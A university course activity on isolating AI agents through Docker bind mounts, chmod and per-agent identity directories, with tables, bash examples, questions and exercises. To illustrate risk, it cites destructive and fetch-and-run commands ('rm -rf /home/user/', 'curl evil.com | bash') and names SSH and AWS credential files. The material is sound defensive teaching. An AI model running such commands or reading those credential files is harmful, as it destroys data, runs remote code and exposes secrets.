<!--
author:   William Mongan
language: en
narrator: US English Male

comment: Render with https://liascript.github.io/course/?https://github.com/BillJr99/Ursinus-CS357/blob/gh-pages/_pages/Activities/liascript-terminalfilesystem.md or locally via https://www.billmongan.com/LiaScript/?https://raw.githubusercontent.com/BillJr99/Ursinus-CS357/gh-pages/_pages/Activities/liascript-terminalfilesystem.md

import: https://raw.githubusercontent.com/liascript/CodeRunner/master/README.md

link:   https://cdn.jsdelivr.net/gh/BillJr99/Ursinus-Boilerplate-Assets@main/css/liascript-custom.css?v=2025-08-23-4
        https://fonts.googleapis.com/css2?family=Lexend+Deca&display=swap

-->

# Terminal and Filesystem Isolation for Agent Safety

An agent that can write to any path on your filesystem is as dangerous as a houseguest who has been handed the master key — not because they are malicious, but because a single innocent mistake (wrong room, wrong drawer) can cause damage that is difficult or impossible to undo. The key insight of filesystem isolation is not that agents are malicious — it is that agents make *mistakes*, and a mistake inside a bounded workspace is recoverable while a mistake that touches your SSH keys, your production database credentials, or your system binaries may not be.

**Blast radius** is the term security engineers use for "how much damage can one mistake cause?" A well-isolated agent has a small blast radius: even if it does something wrong, the consequences are limited to its designated workspace. This module develops the UNIX concepts, Docker primitives, and practical patterns you need to design small-blast-radius agent deployments.

---

## Directions and Group Roles

Work in your POGIL team with rotated roles (**Manager**, **Recorder**, **Presenter**, **Reflector**). The Reflector should pay special attention to assumptions the team makes about what is "obviously safe" — in security, obvious assumptions are where vulnerabilities live. The Recorder will document the team's bash command sequence for Exercise 1. The Presenter will explain the team's answer to Question 8 to the class.

---

## Key Concepts

| Term | Plain-English Definition | Example You'll See Today |
|------|--------------------------|--------------------------|
| **Filesystem** | The organized hierarchy of directories and files on a computer, starting from a root (`/`) and branching into paths like `/home/user/projects/` | An agent reading `/workspace/input/data.txt` and writing results to `/workspace/output/summary.md` |
| **Blast Radius** | The maximum amount of damage a single mistake or malicious action can cause — a small blast radius means mistakes are contained and recoverable | An agent with write access only to `/workspace/output` has a small blast radius; one with access to `/` has an unlimited blast radius |
| **Principle of Least Privilege** | The security principle that every process should have exactly the permissions it needs to do its job — no more, no less | Giving a research agent read-only access to one knowledge base directory instead of read-write access to the entire home folder |
| **Bind Mount** | A Docker feature that makes a directory from the host machine visible inside a container, optionally as read-only | `-v /home/user/data:/data:ro` makes `/home/user/data` appear as `/data` inside the container and blocks all writes |
| **Identity Directory** | A dedicated home directory for one specific agent, containing only that agent's config, memory files, logs, and workspace — separate from every other agent's directory | `/home/user/agents/researcher/` contains only the researcher agent's files; the writer agent cannot see inside it |
| **chmod** | The Linux command for changing who is allowed to read, write, or execute a file or directory | `chmod 700 /agents/researcher` means only the owning user can enter that directory; everyone else is blocked |

---

### Before You Start

**What you need:** Docker and a terminal.

**What you will have at the end:** an agent sandbox where you can state exactly what the agent may read and write.

Work through the sections in order — each one builds on the last, and the code blocks are meant to be run as you reach them, not read past.

---

## Model 1: Filesystem Access Permissions for Three Agent Configurations

The three configurations below represent a spectrum from minimal to dangerous. Each row describes a real deployment pattern. The filesystem is the agent's workspace — getting permissions wrong is like giving a houseguest the master key to your house instead of a key to just the guest room. Study the access model and the resulting risk level before answering questions.

Study the Risk Level and "Why This Risk Level" columns first, then work backward to understand which access rules produced that risk level — this reverse-reading reveals the security reasoning more clearly than reading left to right.

| Agent Type | Filesystem Access | Network Access | Can Execute Shell? | Risk Level | Why This Risk Level |
|---|---|---|---|---|---|
| **Research Agent** | Read-only bind mount of `/home/user/knowledgebase` only; the agent cannot write to any path on the system | Outbound HTTPS to a whitelist of approved domains only; all other network traffic is blocked | No — the agent can only call registered tool functions; it cannot run `subprocess` or `exec` commands | Low | The agent can read stale data and produce wrong answers, but it cannot modify files, steal secrets it cannot reach, or install malware; mistakes are safe to recover from |
| **Writer Agent** | Write access to `/workspace/output` only; read access to `/workspace/input` (read-only flag set); no access to any other part of the filesystem | No network access at all — the agent is fully air-gapped from the internet | No — tool calls only, no shell access | Low-Medium | A hallucinated or incorrect output goes into `/workspace/output` and can be reviewed before use; the agent cannot read secrets elsewhere on the system or send data to an attacker |
| **Admin Agent** | Full read-write access to `/` — the root of the entire filesystem, including system directories | Unrestricted outbound network access to any address on the internet | Yes — can run arbitrary shell commands including `rm`, `curl`, `python`, and `ssh` | Critical | A single hallucinated command (`rm -rf /home/user/` or `curl evil.com \| bash`) is unrecoverable and could destroy the system, steal all credentials, or install persistent malware; there is no ceiling on how bad a mistake can be |

### Critical Thinking Questions

1. The Research Agent is described as "read-only" but still carries a non-trivial risk: it can read stale data. Explain what "stale data" means in the context of a knowledge base (a collection of documents the agent uses to answer questions), and describe a specific scenario where reading correct-but-outdated information causes a downstream agent to produce harmful output.

   *Hint: Imagine the knowledge base contains drug dosage guidelines that were updated six months ago but the knowledge base was never refreshed. The agent reads the old guidelines and uses them to answer a medical question. What happens?*

2. The Admin Agent's risk level is "Critical" even though its purpose (system administration) might seem to require broad access. Propose a way to decompose the Admin Agent's tasks into two or more lower-privilege agents that together accomplish the same administrative goals while keeping each agent's blast radius small.

   *Hint: An admin might need to (a) read log files to diagnose problems, (b) restart services, and (c) update config files. Do all three actions require the same permissions? Could three separate agents each handle one task with only the access that task requires?*

3. The Writer Agent has *no network access*. Why is this restriction specifically important for an LLM-powered writer agent, beyond the general principle of least privilege? What specific class of harm does network access enable for a writer agent that would not apply to a typical offline program?

   *Hint: Consider what an LLM-powered agent might do if it could make outbound HTTP requests. Could it exfiltrate the content it is writing to an external server? Could a prompt injection in an input document cause it to send data somewhere unexpected?*

---

## Model 2: Setting Up Identity Directories and Running a Constrained Agent

Each agent in a multi-agent system should have its own **identity directory**: a home directory that contains only that agent's configuration, memory files, logs, and workspace. Agents that share a home directory can accidentally read each other's memory or logs, creating information leakage between agents that were designed to be independent.

Think of identity directories like individual lockers in a school — each student (agent) has their own locker and cannot open anyone else's. The teacher (the orchestrator) has a master key but only uses it when necessary.

The following terminal session sets up a two-agent workspace with isolated identity directories. Read each comment carefully — the comments explain *why* each command is written the way it is, not just *what* it does.

The following terminal session creates two agent identity directories with restrictive permissions, then runs each agent in a Docker container with carefully scoped mounts. Read the comments inside the code — each one explains a security decision, not just a syntax choice.

```bash
# Create the top-level agents directory under the project root
# mkdir -p creates all parent directories if they do not exist yet
mkdir -p /home/user/projects/myapp/agents

# Create identity directories for each agent
# The curly-brace notation {config,memory,logs,workspace} creates four subdirectories at once
# config = agent's settings, memory = things the agent remembers between runs,
# logs = record of what the agent did, workspace = files the agent is currently working on
mkdir -p /home/user/projects/myapp/agents/researcher/{config,memory,logs,workspace}
mkdir -p /home/user/projects/myapp/agents/writer/{config,memory,logs,workspace}

# Set restrictive permissions so only the owning user can enter these directories
# chmod 700 means: owner can read/write/enter; group members cannot; everyone else cannot
# Without this, any other user on the system could read the agent's memory and logs
chmod 700 /home/user/projects/myapp/agents/researcher
chmod 700 /home/user/projects/myapp/agents/writer

# Create a shared knowledge base that the researcher can read
# chmod 755 means: owner can read/write/enter; everyone else can read and enter (but not write)
# This makes the knowledge base readable by the agent inside Docker, which runs as a different UID
mkdir -p /home/user/projects/myapp/shared/knowledgebase
chmod 755 /home/user/projects/myapp/shared/knowledgebase

# Create an output directory the writer will produce files in
# chmod 750 means: owner can read/write/enter; group members can read and enter; others cannot
mkdir -p /home/user/projects/myapp/shared/output
chmod 750 /home/user/projects/myapp/shared/output

# Run the researcher agent in a Docker container with carefully chosen volume mounts:
# -v .../researcher:/home/agent:rw  -> researcher's own identity dir, read-write (it can save memory/logs)
# -v .../knowledgebase:/data/kb:ro  -> shared knowledge base, READ-ONLY (it cannot change the source docs)
# --network none                    -> no internet access (prevents data exfiltration)
# The writer's identity directory is NOT mounted here — researcher literally cannot see it
docker run --rm \
  -v /home/user/projects/myapp/agents/researcher:/home/agent:rw \
  -v /home/user/projects/myapp/shared/knowledgebase:/data/kb:ro \
  --network none \
  my-researcher-image \
  python agent.py --task "summarize recent papers on RAG retrieval"
# Expected: the agent runs, writes summaries to /home/agent/workspace/, exits cleanly

# Run the writer agent with its own separate set of mounts:
# -v .../writer:/home/agent:rw           -> writer's own identity dir, read-write
# -v .../shared/output:/workspace/output:rw  -> shared output dir, read-write (writer produces files here)
# -v .../researcher/workspace:/workspace/input:ro  -> researcher's OUTPUT only, read-only
# Notice: the writer gets researcher's WORKSPACE (output files), NOT researcher's config or memory
docker run --rm \
  -v /home/user/projects/myapp/agents/writer:/home/agent:rw \
  -v /home/user/projects/myapp/shared/output:/workspace/output:rw \
  -v /home/user/projects/myapp/agents/researcher/workspace:/workspace/input:ro \
  --network none \
  my-writer-image \
  python agent.py --task "draft a 500-word section from the summaries"
# Expected: the agent reads summaries from /workspace/input/, writes a draft to /workspace/output/
```

The table below maps the same physical directories to what each agent sees inside its container. Notice that some paths on the host are completely invisible to one agent — Docker's mount system enforces this, not convention.

**Before vs. After: What the Agent Can See**

| Path on Host | Researcher Sees It As | Writer Sees It As |
|---|---|---|
| `/home/user/projects/myapp/agents/researcher/` | `/home/agent/` (read-write) | Not visible at all |
| `/home/user/projects/myapp/agents/writer/` | Not visible at all | `/home/agent/` (read-write) |
| `/home/user/projects/myapp/shared/knowledgebase/` | `/data/kb/` (read-only) | Not visible at all |
| `/home/user/projects/myapp/agents/researcher/workspace/` | `/home/agent/workspace/` (read-write) | `/workspace/input/` (read-only) |
| `/home/user/projects/myapp/shared/output/` | Not visible at all | `/workspace/output/` (read-write) |

> **Common Misconception:** Many students assume that "running in Docker" automatically prevents an agent from accessing sensitive files. It does not — Docker only isolates what you tell it to isolate. If you mount `/home/user:/home/user`, the agent inside the container can read your SSH keys, browser cookies, and git credentials just as easily as if Docker were not there at all. The safety comes from choosing restrictive mounts, not from Docker itself.

### Critical Thinking Questions

4. In the Docker commands above, the researcher's full identity directory is NOT mounted into the writer's container. The writer only gets `researcher/workspace` as read-only input. Why is this distinction important? What specific files inside the researcher's identity directory should the writer agent never be able to access?

   *Hint: The researcher's `config/` directory might contain API keys or credentials the researcher uses to call external services. The researcher's `memory/` directory might contain a record of every task it has ever worked on, including tasks from other projects. Should the writer need any of that information to draft a 500-word section?*

5. Both agents run with `--network none`. Now suppose the researcher needs to call a web search API to find recent papers. Rewrite the researcher's `docker run` command to allow *only* outbound HTTPS traffic to `api.searchprovider.com`, and describe what additional piece of infrastructure (not a Docker flag) would actually be needed to enforce this at the network level.

   *Hint: `--network none` is a binary switch — network on or network off. To allow only one specific destination, you need something that can inspect network packets and block everything except traffic to one IP address. What kind of network component does that?*

6. Log files in `agents/researcher/logs/` accumulate over time and record everything the agent did during a run. Explain why these logs function as an **audit trail**, and describe two specific, concrete things a security engineer could learn from reviewing them after a suspicious agent run.

   *Hint: If the logs record every file the agent read, every tool it called, and every output it produced, what could those records reveal about whether the agent was behaving normally or had been manipulated by a prompt injection attack?*

An agent's **identity directory** is designed to:

[( )] Give the agent access to the entire user home directory for maximum flexibility — mounting `/home/user` gives each agent a consistent, full-featured environment to work in
[( )] Store the agent's model weights and embedding indices — keeping model artifacts in the identity directory ensures the agent always uses the correct model version
[(X)] Provide each agent with an isolated space for its own config, memory, logs, and workspace so agents cannot accidentally access each other's state
[( )] Replace Docker isolation as a lighter-weight alternative — identity directories provide the same filesystem isolation as Docker without the container overhead

---

## Model 3: Docker Volume Mounts — What Can the Agent Touch?

Two students are deploying the same researcher agent. Their Docker commands look similar but have dramatically different security properties. Study the difference carefully.

The key to reading these commands is understanding the `-v` flag: `-v HOST_PATH:CONTAINER_PATH:FLAGS`. The host path is what exists on your real machine; the container path is what the agent sees inside Docker; the optional `:ro` flag means read-only (no writes allowed).

The two `docker run` commands below implement the same agent with dramatically different security properties. Read each one and predict the blast radius before looking at the comparison table.

**Student A's command:**

```bash
# Student A mounts their ENTIRE home directory into the container
# The agent inside the container sees /home/user — which includes:
#   - SSH private keys at ~/.ssh/id_rsa (used to authenticate to servers)
#   - AWS credentials at ~/.aws/credentials (used to access cloud services)
#   - Git config at ~/.gitconfig (contains name, email, and sometimes tokens)
#   - Every project, download, and document in the home directory
docker run --rm \
  -v /home/user:/home/user \    # <-- THIS is the problem: the entire home is mounted
  my-researcher-image \
  python agent.py
```

**Student B's command:**

```bash
# Student B mounts ONLY the researcher's specific workspace directory
# :ro at the end means read-only — even if the agent tries to write, it will get a permission error
# The agent inside the container sees /workspace — which contains ONLY:
#   - The files the researcher was given to work with
#   - Nothing else from the host machine
docker run --rm \
  -v /home/user/agents/researcher:/workspace:ro \    # <-- ONLY the researcher dir, read-only
  my-researcher-image \
  python agent.py
```

| Question | Student A — What Actually Happens | Student B — What Actually Happens |
|---|---|---|
| What path does the agent see inside the container? | `/home/user` — the agent's view of the filesystem matches the real home directory exactly | `/workspace` — the agent can only see the single researcher directory, renamed to `/workspace` inside the container |
| Can the agent read `~/.ssh/id_rsa` (private SSH key)? | Yes — SSH keys are in `/home/user/.ssh/` which is fully mounted; the agent can read and transmit the key | No — only `/workspace` is mounted; `~/.ssh/` does not exist inside this container |
| Can the agent read `~/.aws/credentials` (AWS access keys)? | Yes — AWS credentials live in the mounted home directory and are fully readable | No — only `/workspace` is mounted; `.aws/` does not exist inside this container |
| Can the agent modify files it can read? | Yes — no `:ro` flag was used, so all mounted files are read-write by default | No — the `:ro` flag makes the entire mount read-only; any write attempt returns "Read-only file system" error |
| If the agent hallucinates a destructive write command like `rm -rf /home/user/documents`, what is damaged? | Every file in `/home/user/documents/` is permanently deleted, including all projects and personal files | The write attempt fails immediately with a permission error; no files are changed |
| What is the blast radius of the worst possible agent action? | Unlimited within the user's home directory — every file, credential, and project is at risk | Zero for writes (read-only mount) — the agent literally cannot change anything on the host |

### Critical Thinking Questions

7. Student A's mount exposes `~/.gitconfig`, which contains the user's name and email address. This seems harmless — it is not a password or a private key. Describe a concrete scenario where an agent with read access to `.gitconfig` *and* write access to a git repository could use that information in a way the user did not intend.

   *Hint: Git uses the name and email from `.gitconfig` when creating commits. If the agent can make commits on your behalf using your name and email, what could it commit, and whose reputation would be affected?*

8. Student B's mount is read-only, which prevents the researcher agent from writing its own logs or memory files inside `/workspace`. This seems to break the identity-directory pattern from Model 2 (where the agent needed to write to its own directory). How do you resolve this tension? Rewrite Student B's command to allow write access to a specific subdirectory for logs and memory while keeping all other content read-only.

   *Starter hint: You can add a second `-v` flag to a single `docker run` command. A second mount with `:rw` on a specific subdirectory will give write access just to that path, even if the main mount is `:ro`.*

   ```bash
   # Your revised command goes here
   # You need two -v flags: one for the read-only researcher content,
   # one for a writable logs/memory location
   docker run --rm \
     -v /home/user/agents/researcher:/workspace:ro \
     -v ??? \   # <-- add a second mount here for write access
     my-researcher-image \
     python agent.py
   ```

9. Two agents share a single read-write filesystem volume mounted at `/shared/output`. Agent 1 writes a file called `draft.md` containing its summary. Agent 2 also writes a file called `draft.md` containing its own different summary. Describe exactly what happens at the filesystem level when Agent 2 writes its file, and explain why this is a problem for the pipeline. What naming convention or coordination mechanism would prevent this collision?

   *Hint: Filesystems do not lock files between separate processes by default — one process can silently overwrite another's file. What information that each agent already has could be used to create a unique filename that avoids collisions?*

---

## Exercises

1. **Build a safe agent workspace.**

   *What to do:* Write the complete sequence of `mkdir`, `chmod`, and `docker run` commands to set up a safe workspace for a three-agent pipeline (ResearchAgent, WriterAgent, CriticAgent). Each agent should have its own identity directory. Data flow: ResearchAgent writes to its own workspace; WriterAgent reads ResearchAgent's workspace (read-only) and writes to its own; CriticAgent reads WriterAgent's workspace (read-only) and writes its verdict to a shared `/output` directory. No agent should be able to read another agent's `config/` or `logs/` directory.

   *Starter hint:* Start by drawing the directory tree on paper before writing any commands:
   ```
   /home/user/agents/
     researcher/{config,memory,logs,workspace}/
     writer/{config,memory,logs,workspace}/
     critic/{config,memory,logs,workspace}/
   /home/user/shared/
     output/
   ```
   Then for each `docker run` command, list the `-v` flags you need: one for the agent's own identity dir (`:rw`), one for its input (`:ro`), and one for its output (`:rw`).

   *You've succeeded when* your Presenter can explain which `-v` flag in each `docker run` command enforces each part of the "no agent reads another's config or logs" requirement.

2. **Blast radius calculation.**

   *What to do:* For each of the following agent configurations, calculate and justify the blast radius — the maximum damage a single bad command could cause. Rank the three configurations from safest to most dangerous.

   - (a) Agent runs as root inside a container with `docker run -v /:/host` (the entire host filesystem mounted).
   - (b) Agent runs as non-root user `agentuser` with write access only to `/workspace/output`.
   - (c) Agent runs in Docker with the `--read-only` flag and a single tmpfs (RAM disk) mount at `/tmp`.

   *Starter hint:* For each configuration, ask: "What is the most destructive single command this agent could run?" For (a), consider `rm -rf /host`. For (b), consider `rm -rf /workspace/output`. For (c), consider whether writes outside `/tmp` are even possible.

   *You've succeeded when* you can explain in one sentence per configuration exactly what is protected and what is still at risk.

3. **Filesystem as memory.**

   *What to do:* An agent writes its working notes to `memory/notes.md` and its completed task list to `memory/completed.json` inside its identity directory. Compare this approach to keeping all state in the LLM's in-context memory (the conversation history). List two advantages and two disadvantages of each approach. Then answer: when would you prefer file-based memory, and when would you prefer in-context memory?

   *Starter hint:* Think about what happens when the agent's conversation runs too long and older context scrolls out. File-based memory persists across sessions; in-context memory is lost when the conversation ends. But file-based memory must be read back into context explicitly — it is not automatically available to the model.

   *You've succeeded when* you have a concrete scenario for each approach where one is clearly better than the other.

---

## Reflection Prompt

*Personal:* The principle of least privilege says every process should have exactly the access it needs and nothing more. Think of a role you have held — a job, a club, a sports team — where you had more access, information, or authority than you needed to do your part. Did that excess access create any risks you were aware of at the time?

*Technical:* Today we applied least privilege to Docker volume mounts. Describe a specific scenario where a developer, in a hurry, would be tempted to use Student A's approach (mounting the full home directory) instead of Student B's approach. What pressure leads to that shortcut, and what would a safe-by-default tooling design look like that makes the restrictive option easier than the permissive one?

*Societal:* Filesystem isolation limits what an AI agent can do on your personal machine. But many agents operate on cloud infrastructure where "the filesystem" is a database or an object store shared by thousands of users. What is the equivalent of "identity directories" in a multi-tenant cloud environment, and who is responsible for enforcing those boundaries — the cloud provider, the application developer, or the user?

> *Hint:* Consider what "tenant isolation" means in a shared database: each tenant's rows are stored in the same physical tables, but a row-level security policy ensures queries only return that tenant's data. Is that the same guarantee as a Docker volume mount, or a weaker one?

---

-> Coming Up Next: Identity directories and bind mounts are filesystem-level controls. The next activity zooms out to the container level — examining what Docker's namespace and cgroup isolation actually guarantees, and what it leaves unprotected, when the process inside is an AI agent that can generate and execute code.

---

## Further Reading

- "The Principle of Least Privilege." OWASP Top Ten documentation. https://owasp.org/www-project-developer-guide/draft/design/web_app_checklist/digital_identity/ — foundational security principle applied throughout this module.
- Docker Documentation: "Use volumes." https://docs.docker.com/storage/volumes/ — specifically the sections on bind mounts vs. named volumes and read-only mounts.
- Julia Evans. "How containers work: overlayfs." https://jvns.ca/blog/2019/11/18/how-containers-work--overlayfs/ — intuitive explanation of what Docker isolation actually does at the filesystem level.
- Saltzer and Schroeder. "The Protection of Information in Computer Systems." *Proceedings of the IEEE* (1975). The original paper enumerating least privilege, fail-safe defaults, and economy of mechanism — principles that are fifty years old and still directly applicable to agent design.
